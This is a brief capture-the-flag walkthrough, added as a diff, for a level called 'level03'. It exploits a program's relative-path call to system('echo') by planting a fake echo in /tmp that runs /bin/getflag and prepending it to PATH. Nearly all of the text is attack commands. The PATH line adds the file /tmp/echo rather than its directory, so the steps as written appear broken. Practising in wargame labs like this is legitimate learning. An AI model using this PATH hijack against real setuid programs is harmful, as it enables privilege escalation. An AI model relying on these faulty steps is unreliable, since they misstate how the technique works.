@@ -1,0 +1,12 @@
+Starting executable 'level03' > 'Exploit me'
+
+We see in the code that it calls system(echo) with a relative path.
+
+We can exploit that.
+
+vim /tmp/echo  >>> /bin/getflag
+chmod 777 /tmp/echo
+
+export PATH=/tmp/echo:$PATH
+
+run 'level03' again, we get the flag
